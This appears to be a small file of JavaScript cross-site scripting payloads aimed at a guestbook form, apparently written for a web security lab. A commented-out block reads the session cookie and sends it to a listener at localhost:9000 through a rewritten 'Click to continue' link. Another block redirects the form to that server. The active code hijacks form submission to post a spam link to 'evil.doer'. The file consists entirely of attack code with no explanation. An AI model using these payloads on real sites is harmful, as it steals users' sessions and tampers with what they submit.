/*
token = document.cookie.split("=")[1]
body = document.querySelectorAll("body")[0]
url = "http://localhost:9000/" + token
body.innerHTML = "<a href=" + url + ">Click to continue</a>"
*/

/*
form = document.querySelectorAll("form")
url = "http://localhost:9000/" + token
newform = "<form action=" + url + " method=get>"
newform += "<p><input name=guest></p>"
newform += "<p><button>Sign the book!</button></p>"
newform += "</form>"
form.innerHTML= newform
*/

form  = document.querySelectorAll('form')[0]
form.addEventListener("submit", function() {
    comment = "Buy from my website: http://evil.doer/";
    input = "<input name=guest value=\"" + comment + "\">";
    form.innerHTML = input;
})
